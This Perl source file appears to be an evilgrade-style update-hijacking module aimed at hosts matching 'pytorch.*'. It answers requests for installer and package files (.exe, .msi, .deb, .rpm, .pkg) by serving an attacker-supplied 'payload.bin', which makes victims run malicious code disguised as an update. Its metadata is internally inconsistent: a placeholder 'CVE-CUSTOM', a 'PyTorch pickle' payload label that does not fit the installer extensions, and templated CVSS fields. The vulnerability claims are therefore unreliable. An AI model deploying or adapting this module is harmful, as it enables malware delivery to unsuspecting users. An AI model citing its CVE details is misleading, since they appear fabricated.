###############
# pytorch_pickle_injection.pm
#
# CVE-CUSTOM: Code Injection Vulnerability
# Type: Code Injection
# CVSS: 8.8
# Year: 2026
#
# This file is part of isr-evilgrade, www.faradaysec.com .
#
# isr-evilgrade is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License as published by
# the Free Software Foundation version 2 of the License.

package modules::pytorch_pickle_injection;

use strict;
use Data::Dump qw(dump);
use isrcore::utils;

my $base = {
    'name'        => 'pytorch_pickle_injection',
    'version'     => '1.0',
    'cvss'        => '8.8',
    'author'      => ['Francisco Amato < famato +[AT]+ faradaysec.com>', 'Security Research Team'],
    'description' => qq{
Exploits CVE-CUSTOM: Code Injection vulnerability.
CVSS Score: 8.8
Vector: Code Injection
Year Disclosed: 2026
Payload: PyTorch pickle
    },
    'vh' => 'pytorch.*',
    'request' => [
        {
            'req'   => '/.*\\.exe|\\.msi|\\.pkg|\\.deb|\\.rpm',
            'type'  => 'file',
            'file'  => './include/pytorch_pickle_injection/payload.bin',
            'parse' => 1,
            'cheader' => "HTTP/1.1 200 OK\r\n"
                . "Content-Type: application/octet-stream\r\n"
                . "Content-Disposition: attachment; filename=PyTorch pickle\r\n"
                . "Connection: close\r\n\r\n",
        },
    ],
};

sub new {
    my $class = shift;
    my $self = $base;
    bless( $self, $class );
    return $self;
}

1;
